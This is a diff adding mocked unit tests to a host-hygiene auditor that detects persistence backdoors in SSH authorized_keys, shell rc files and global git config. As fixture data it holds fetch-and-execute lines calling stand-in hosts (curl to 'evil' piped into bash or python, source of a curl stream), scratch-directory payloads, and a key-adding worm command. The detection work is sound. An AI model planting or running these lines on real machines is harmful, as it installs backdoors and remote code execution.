@@ -2,6 +2,7 @@
 """Local machine hygiene checks (credentials + VS Code), all mocked — no real probing."""
 from __future__ import annotations
 
+import os
 import tempfile
 import unittest
 from pathlib import Path
@@ -306,6 +307,398 @@ class TestVSCode(unittest.TestCase):
         # No path given → auto-detect; when VS Code isn't installed it returns None.
         with mock.patch.object(hygiene, "_vscode_user_settings", return_value=None):
             self.assertEqual(hygiene.check_vscode(), [])
+
+
+class TestSSHAuthorizedKeys(unittest.TestCase):
+    """~/.ssh/authorized_keys — the SSH-persistence sink GhostApproval writes to (#1161)."""
+
+    def _home(self, authkeys: str | None = None, dir_mode=0o700, file_mode=0o600):
+        d = Path(tempfile.mkdtemp())
+        ssh = d / ".ssh"
+        ssh.mkdir()
+        os.chmod(ssh, dir_mode)
+        if authkeys is not None:
+            ak = ssh / "authorized_keys"
+            ak.write_text(authkeys, encoding="utf-8")
+            os.chmod(ak, file_mode)
+        return d
+
+    def test_world_writable_ssh_dir_warns(self):
+        d = self._home(dir_mode=0o707)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
+        self.assertIn("ssh-dir-writable", ids)
+
+    def test_world_writable_authorized_keys_warns(self):
+        d = self._home("ssh-ed25519 AAAAC3Nz me@host\n", file_mode=0o666)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
+        self.assertIn("ssh-authorized-keys-writable", ids)
+
+    def test_backdoor_forced_command_is_warning_and_incident_trigger(self):
+        ak = 'command="curl http://x|bash",no-pty ssh-ed25519 AAAAC3Nz attacker@evil\n'
+        d = self._home(ak)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            issues = hygiene.check_ssh_authorized_keys()
+        issue = next(i for i in issues if i.id == "ssh-authorized-keys-forced-command")
+        self.assertEqual(issue.severity, "warning")
+        self.assertIn("ssh-authorized-keys-forced-command", hygiene.INCIDENT_TRIGGER_IDS)
+        # remediation is wiper-safe (neutralize before rotate)
+        self.assertIn("gh-token-monitor.service", issue.remediation)
+
+    def test_benign_restricted_key_is_info_not_warning(self):
+        # A forced command with NO fetch/decode/scratch shape (rsync/borg/git-shell) → info review.
+        ak = 'command="/usr/bin/borg serve --restrict-to-path /backup" ssh-ed25519 AAAA bkp@host\n'
+        d = self._home(ak)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            issues = hygiene.check_ssh_authorized_keys()
+        self.assertEqual([i.id for i in issues], ["ssh-authorized-keys-restricted"])
+        self.assertEqual(issues[0].severity, "info")
+
+    def test_forced_command_scratch_data_arg_is_info(self):
+        # FP fix: a scratch path used as a DATA argument (borg/rrsync --restrict-to-path) is NOT a
+        # backdoor — only the executable being in a scratch dir is. Must be info, never a warning.
+        for ak in ('command="borg serve --restrict-to-path /var/tmp/repo",restrict ssh-ed25519 AAAA b@h\n',
+                   'command="rrsync -ro /srv/tmp/pub" ssh-ed25519 AAAA r@h\n'):
+            d = self._home(ak)
+            with mock.patch.object(hygiene.Path, "home", return_value=d):
+                issues = hygiene.check_ssh_authorized_keys()
+            self.assertEqual([i.id for i in issues], ["ssh-authorized-keys-restricted"], ak)
+
+    def test_forced_command_executable_in_scratch_warns(self):
+        # ...but the forced EXECUTABLE itself living in a scratch dir IS a backdoor.
+        d = self._home('command="/tmp/.x/backdoor" ssh-ed25519 AAAA a@e\n')
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
+        self.assertIn("ssh-authorized-keys-forced-command", ids)
+
+    def test_command_in_comment_is_info_not_warning(self):
+        # Fail-closed whole-line scan reads command="…" even from the trailing comment (so a backdoor on
+        # an odd key-type line is never dropped). A benign comment carries no payload → info, not warning.
+        d = self._home('ssh-ed25519 AAAAC3Nz my key command="cleanup /tmp/ cache"\n')
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            issues = hygiene.check_ssh_authorized_keys()
+        self.assertEqual([(i.id, i.severity) for i in issues],
+                         [("ssh-authorized-keys-restricted", "info")])
+
+    def test_cert_key_type_backdoor_is_not_dropped(self):
+        # Fail-closed: a forced-command backdoor on a certificate key-type line (unrecognized by any
+        # key-type allowlist) must still be flagged, not silently skipped.
+        d = self._home('command="/tmp/payload" ssh-ed25519-cert-v01@openssh.com AAAA attacker@evil\n')
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
+        self.assertIn("ssh-authorized-keys-forced-command", ids)
+
+    def test_self_propagating_command_is_flagged(self):
+        # A worm forced-command that re-adds its own key (contains a key-type substring) then runs a
+        # scratch payload must warn — the key-type substring must not derail parsing.
+        d = self._home('command="echo ssh-ed25519 AAAA >> ~/.ssh/authorized_keys; /tmp/x"'
+                       ' ssh-ed25519 AAAA attacker@evil\n')
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
+        self.assertIn("ssh-authorized-keys-forced-command", ids)
+
+    def test_wrapper_and_separator_scratch_exec_warns(self):
+        # A scratch executable reached via a wrapper (nohup/env) or after a separator is still a backdoor.
+        for ak in ('command="nohup /tmp/payload &" ssh-ed25519 AAAA a@e\n',
+                   'command="env X=1 /tmp/payload" ssh-ed25519 AAAA a@e\n'):
+            d = self._home(ak)
+            with mock.patch.object(hygiene.Path, "home", return_value=d):
+                ids = [i.id for i in hygiene.check_ssh_authorized_keys()]
+            self.assertIn("ssh-authorized-keys-forced-command", ids, ak)
+
+    def test_plain_keys_are_clean(self):
+        ak = ("ssh-ed25519 AAAAC3NzaC1lZDI1 laptop@home\n"
+              "ssh-rsa AAAAB3NzaC1yc2E desktop@work\n")
+        d = self._home(ak)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])
+
+    def test_no_ssh_dir_is_noop(self):
+        d = Path(tempfile.mkdtemp())                 # no ~/.ssh at all
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])
+
+    def test_group_writable_is_not_flagged(self):
+        # per-user-private-group distros (umask 002) make benign files group-writable — must NOT warn.
+        d = self._home("ssh-ed25519 AAAA me@host\n", dir_mode=0o770, file_mode=0o660)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual(hygiene.check_ssh_authorized_keys(), [])
+
+
+class TestShellProfile(unittest.TestCase):
+    """Shell startup files — a fetch-to-shell line runs on every new shell (T1546.004)."""
+
+    def _home_with_rc(self, name: str, body: str):
+        d = Path(tempfile.mkdtemp())
+        (d / name).write_text(body, encoding="utf-8")
+        return d
+
+    def test_fetch_pipe_shell_in_zshrc_warns(self):
+        d = self._home_with_rc(".zshrc", "export EDITOR=vim\ncurl -fsSL http://evil | bash\n")
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            issues = hygiene.check_shell_profile()
+        self.assertEqual([i.id for i in issues], ["shell-profile-fetch-exec"])
+        self.assertEqual(issues[0].severity, "warning")
+        self.assertIn("shell-profile-fetch-exec", hygiene.INCIDENT_TRIGGER_IDS)
+
+    def test_realistic_rc_with_tool_init_is_clean(self):
+        body = (
+            '# my zshrc\n'
+            'export PATH="$HOME/bin:$PATH"\n'
+            'eval "$(rbenv init -)"\n'
+            'eval "$(pyenv init -)"\n'
+            'eval "$(direnv hook zsh)"\n'
+            'eval "$(/opt/homebrew/bin/brew shellenv)"\n'
+            'alias ll="ls -la"\n'
+            'source ~/.zsh_aliases\n'
+            '[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh\n'
+        )
+        d = self._home_with_rc(".zshrc", body)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual(hygiene.check_shell_profile(), [])
+
+    def test_commented_out_line_is_clean(self):
+        d = self._home_with_rc(".bashrc", "# curl http://x | bash  (disabled)\n")
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual(hygiene.check_shell_profile(), [])
+
+    def test_base64_decode_exec_warns(self):
+        d = self._home_with_rc(".profile", "echo Zm9v | base64 -d | sh\n")
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual([i.id for i in hygiene.check_shell_profile()],
+                             ["shell-profile-fetch-exec"])
+
+    def test_fetch_pipe_to_data_interpreter_is_clean(self):
+        # FP fix: piping a fetch/decode into a data-CONSUMING interpreter (formatter/filter/diff) is
+        # data, not exec. JWT decode, API pretty-print, proc-sub into diff, curl|jq, curl|node script.
+        body = (
+            'alias jwtd="cut -d. -f2 | base64 -d | python3 -m json.tool"\n'
+            'alias ipinfo="curl -s ipinfo.io | python3 -m json.tool"\n'
+            'alias apidiff="diff <(curl -s http://a) <(curl -s http://b)"\n'
+            'curl -s http://x | jq .\n'
+            'curl -s http://x | node format.js\n'
+        )
+        d = self._home_with_rc(".zshrc", body)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual(hygiene.check_shell_profile(), [])
+
+    def test_bare_interpreter_pipe_still_warns(self):
+        # ...but a BARE interpreter (no program arg) executes stdin as code — still a backdoor.
+        d = self._home_with_rc(".bashrc", "curl -fsSL http://evil | python\n")
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])
+
+    def test_sourcing_fetch_still_warns(self):
+        # A shell/source consumer before <(curl …) IS exec (unlike diff <(curl …)).
+        d = self._home_with_rc(".zshrc", "source <(curl -sL http://evil.fish)\n")
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])
+
+    def test_stdin_as_script_dash_warns(self):
+        # `python -` reads the program from stdin — identical to bare `curl|python`, must warn.
+        d = self._home_with_rc(".bashrc", "curl -fsSL http://evil | python -\n")
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual([i.id for i in hygiene.check_shell_profile()], ["shell-profile-fetch-exec"])
+
+    def test_current_dir_argument_to_scratch_is_clean(self):
+        # `.` as the current-dir ARGUMENT (rsync/cp/diff source) into a /tmp destination is not
+        # dot-source — must not fire (round-2 FP).
+        body = ('alias backup="rsync -a . /tmp/backup"\n'
+                'alias snap="cp -r . /var/tmp/snap"\n'
+                'alias cmp="diff . /tmp/checkout"\n')
+        d = self._home_with_rc(".zshrc", body)
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual(hygiene.check_shell_profile(), [])
+
+    def test_direct_scratch_execution_warns(self):
+        # Running a scratch binary directly (after a separator, or via a wrapper) is a backdoor shape.
+        for line in ("true && /tmp/.x/run\n", "nohup /dev/shm/rev &\n", "; env A=1 /tmp/p\n"):
+            d = self._home_with_rc(".bashrc", line)
+            with mock.patch.object(hygiene.Path, "home", return_value=d):
+                self.assertEqual([i.id for i in hygiene.check_shell_profile()],
+                                 ["shell-profile-fetch-exec"], line)
+
+    def test_no_rc_files_is_noop(self):
+        d = Path(tempfile.mkdtemp())
+        with mock.patch.object(hygiene.Path, "home", return_value=d):
+            self.assertEqual(hygiene.check_shell_profile(), [])
+
+
+class TestGitConfigExecution(unittest.TestCase):
+    """Global git config that makes git exec an attacker command (T1546)."""
+
+    def _with_config(self, pairs):
+        return mock.patch.object(hygiene, "_git_global_config", return_value=pairs)
+
+    def test_fsmonitor_command_warns(self):
+        with self._with_config([("core.fsmonitor", "/tmp/mon.sh")]):
+            issues = hygiene.check_git_config_execution()
+        self.assertEqual([i.id for i in issues], ["git-fsmonitor-command"])
+        self.assertEqual(issues[0].severity, "warning")
+
+    def test_fsmonitor_boolean_true_is_clean(self):
+        with self._with_config([("core.fsmonitor", "true")]):
+            self.assertEqual(hygiene.check_git_config_execution(), [])
+
+    def test_hookspath_in_scratch_dir_warns(self):
+        with self._with_config([("core.hookspath", "/tmp/hooks")]):
+            ids = [i.id for i in hygiene.check_git_config_execution()]
+        self.assertEqual(ids, ["git-hookspath-unsafe"])
+
+    def test_hookspath_in_home_is_info(self):
+        with self._with_config([("core.hookspath", "/home/u/.githooks")]):
+            issues = hygiene.check_git_config_execution()
+        self.assertEqual([(i.id, i.severity) for i in issues], [("git-hookspath-set", "info")])
+
+    def test_alias_fetch_exec_warns(self):
+        with self._with_config([("alias.sync", "!curl http://x | sh")]):
+            ids = [i.id for i in hygiene.check_git_config_execution()]
+        self.assertEqual(ids, ["git-config-fetch-exec"])
+
+    def test_benign_config_is_clean(self):
+        with self._with_config([("core.pager", "less"), ("core.editor", "vim"),
+                                ("alias.st", "status"), ("alias.lg", "log --oneline --graph")]):
+            self.assertEqual(hygiene.check_git_config_execution(), [])
+
+    def test_git_absent_is_noop(self):
+        def boom(*a, **k):
+            raise FileNotFoundError
+        with mock.patch.object(hygiene.subprocess, "run", side_effect=boom):
+            self.assertEqual(hygiene._git_global_config(), [])
+
+    def test_z_framing_parse(self):
+        out = "core.pager\0alias.st\nstatus\0core.editor\nvim\0"
+        with mock.patch.object(hygiene.subprocess, "run",
+                               return_value=mock.Mock(returncode=0, stdout=out)):
+            pairs = hygiene._git_global_config()
+        self.assertEqual(pairs, [("core.pager", ""), ("alias.st", "status"),
+                                 ("core.editor", "vim")])
+
+    def test_fsmonitor_external_helper_is_info_not_warning(self):
+        # FP fix: a legit external fsmonitor (watchman wrapper) is non-boolean but not a backdoor.
+        for helper in ("rs-git-fsmonitor", "/Users/dev/.cargo/bin/rs-git-fsmonitor",
+                       ".git/hooks/query-watchman"):
+            with self._with_config([("core.fsmonitor", helper)]):
+                issues = hygiene.check_git_config_execution()
+            self.assertEqual([(i.id, i.severity) for i in issues],
+                             [("git-fsmonitor-external", "info")], helper)
+        self.assertNotIn("git-fsmonitor-external", hygiene.INCIDENT_TRIGGER_IDS)
+
+    def test_fsmonitor_backdoor_shape_still_warns(self):
+        for bad in ("/tmp/mon.sh", "curl -s http://x | bash"):
+            with self._with_config([("core.fsmonitor", bad)]):
+                ids = [i.id for i in hygiene.check_git_config_execution()]
+            self.assertEqual(ids, ["git-fsmonitor-command"], bad)
+
+    def test_fsmonitor_boolean_variants_are_clean(self):
+        for v in ("true", "false", "yes", "no", "on", "off", "1", "0", "TRUE"):
+            with self._with_config([("core.fsmonitor", v)]):
+                self.assertEqual(hygiene.check_git_config_execution(), [], v)
+
+    def test_alias_fetch_to_data_interpreter_is_clean(self):
+        with self._with_config([("alias.prjson",
+                                 "!curl -s https://api.github.com/user | python -m json.tool")]):
+            self.assertEqual(hygiene.check_git_config_execution(), [])
+
+    def test_alias_current_dir_to_scratch_is_clean(self):
+        # `.` as the current-dir sync source (not dot-source) into /tmp — round-2 FP, must stay clean.
+        with self._with_config([("alias.snapshot", "!rsync -a . /tmp/snap")]):
+            self.assertEqual(hygiene.check_git_config_execution(), [])
+
+    def test_alias_scratch_exec_via_bang_sigil_warns(self):
+        # A git shell alias runs a scratch payload on `git <alias>` — the `!` sigil must not hide it.
+        for v in ("!/tmp/evil.sh", "!bash /tmp/x", "!node /tmp/x.js", "!VERSION=1 /tmp/deploy.sh"):
+            with self._with_config([("alias.pwn", v)]):
+                self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
+                                 ["git-config-fetch-exec"], v)
+
+    def test_credential_helper_scratch_exec_via_bang_warns(self):
+        with self._with_config([("credential.helper", "!/tmp/evil")]):
+            self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
+                             ["git-config-fetch-exec"])
+
+    def test_url_scoped_credential_helper_is_not_evaded(self):
+        # A per-URL helper (credential.<url>.helper) execs too — the sub-key variant must not slip.
+        with self._with_config([("credential.https://github.com.helper", "!/tmp/evil")]):
+            self.assertEqual([i.id for i in hygiene.check_git_config_execution()],
+                             ["git-config-fetch-exec"])
+        with self._with_config([("credential.https://github.com.helper", "osxkeychain")]):
+            self.assertEqual(hygiene.check_git_config_execution(), [])
+
+    def test_benign_bang_aliases_and_helpers_are_clean(self):
+        for k, v in [("alias.st", "!git status"), ("alias.visual", "!gitk --all"),
+                     ("alias.co", "checkout"),
+                     ("credential.helper", "!aws codecommit credential-helper $@"),
+                     ("credential.helper", "osxkeychain")]:
+            with self._with_config([(k, v)]):
+                self.assertEqual(hygiene.check_git_config_execution(), [], f"{k}={v}")
+
+    def test_hookspath_with_tmp_path_segment_is_info(self):
+        # A private dir with a 'tmp' path SEGMENT is not the system scratch dir → info, not unsafe.
+        with self._with_config([("core.hookspath", "/opt/acme/tmp/githooks")]):
+            self.assertEqual([(i.id, i.severity) for i in hygiene.check_git_config_execution()],
+                             [("git-hookspath-set", "info")])
+
+    def test_hookspath_with_nul_byte_does_not_crash(self):
+        # An embedded-NUL path value must degrade gracefully (Path.stat raises ValueError, not OSError).
+        with self._with_config([("core.hookspath", "a\x00b/hooks")]):
+            issues = hygiene.check_git_config_execution()   # must not raise
+        self.assertIsInstance(issues, list)
+
+    def test_git_config_decodes_leniently(self):
+        # A config value with a non-locale-decodable byte must not crash the audit (errors="replace").
+        captured = {}
+        def fake_run(cmd, **kw):
+            captured.update(kw)
+            return mock.Mock(returncode=0, stdout="core.pager\0")
+        with mock.patch.object(hygiene.subprocess, "run", side_effect=fake_run):
+            hygiene._git_global_config()
+        self.assertEqual(captured.get("errors"), "replace")
+
+
+class TestMechanismPersistenceComposition(unittest.TestCase):
+    """The three new probes must flow through the single audit() composition site (#1161), and
+    their active-compromise findings must lead the rotate-LAST runbook."""
+
+    def _only(self, name, sentinel):
+        # Mock every OTHER check to [] so audit() yields just the sentinel deterministically.
+        others = {"check_credentials", "check_vscode", "check_branch_protection",
+                  "check_persistence", "check_runner_persistence", "check_host_artifacts",
+                  "check_ssh_authorized_keys", "check_shell_profile",
+                  "check_git_config_execution"} - {name}
+        ctx = [mock.patch.object(hygiene, o, return_value=[]) for o in others]
+        ctx.append(mock.patch.object(hygiene, name, return_value=[sentinel]))
+        return ctx
+
+    def test_audit_composes_each_new_probe(self):
+        for name, sid in [("check_ssh_authorized_keys", "ssh-authorized-keys-forced-command"),
+                          ("check_shell_profile", "shell-profile-fetch-exec"),
+                          ("check_git_config_execution", "git-fsmonitor-command")]:
+            sentinel = hygiene.HygieneIssue(sid, "warning", "T", "D", "F")
+            patches = self._only(name, sentinel)
+            for p in patches:
+                p.start()
+            try:
+                ids = [i.id for i in hygiene.audit()]
+            finally:
+                for p in patches:
+                    p.stop()
+            self.assertIn(sid, ids)
+
+    def test_active_backdoor_ids_trigger_incident_runbook(self):
+        for sid in ("ssh-authorized-keys-forced-command", "shell-profile-fetch-exec",
+                    "git-fsmonitor-command", "git-hookspath-unsafe", "git-config-fetch-exec"):
+            out = hygiene.render([hygiene.HygieneIssue(sid, "warning", "T", "D", "F")]).lower()
+            self.assertIn("rotate last", out, sid)
+            self.assertLess(out.index("isolate the host"), out.index("rotate credentials"), sid)
+
+    def test_hardening_only_findings_do_not_trigger_runbook(self):
+        # Loose perms / info are hardening, not proof of live compromise → no rotate-LAST lead.
+        for sid in ("ssh-dir-writable", "ssh-authorized-keys-writable",
+                    "ssh-authorized-keys-restricted", "git-hookspath-set"):
+            out = hygiene.render([hygiene.HygieneIssue(sid, "warning", "T", "D", "F")])
+            self.assertNotIn("respond in THIS order", out, sid)
 
 
 class TestBranchProtection(unittest.TestCase):
